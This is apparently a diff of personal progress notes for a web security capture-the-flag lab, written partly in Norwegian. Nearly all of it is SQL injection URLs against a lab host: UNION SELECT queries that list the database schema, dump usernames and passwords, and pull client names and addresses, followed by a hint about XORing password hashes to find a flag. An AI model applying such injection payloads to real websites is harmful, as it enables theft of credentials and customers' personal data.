@@ -16,3 +16,7 @@ progress:
 		http://129.241.200.165:39972/index.php?page=member&id=1%20union%20SELECT%20table_name,%20column_name%20from%20information_schema.columns;%20&Submit=Submit#
 		// fant denne med å se rundt i infromation schema
 		http://129.241.200.165:39972/index.php?page=member&id=1%20union%20SELECT%20username,%20password%20from%20Member_Brute_Force.db_default;%20&Submit=Submit#
+		
+		http://129.241.200.165:39972/index.php?page=member&id=-1+union+select+NULL%2C+concat%28first_name28%2C+last_name51%2C+townf8%2C+country80%2C+Commenta7%29+from+clients&Submit=Submit#
+		
+	ctrl f flag:  Xor bitwise all hash passwords in this table that begin with the same two hexadecimal characters as the Cookie Tampering Flag.
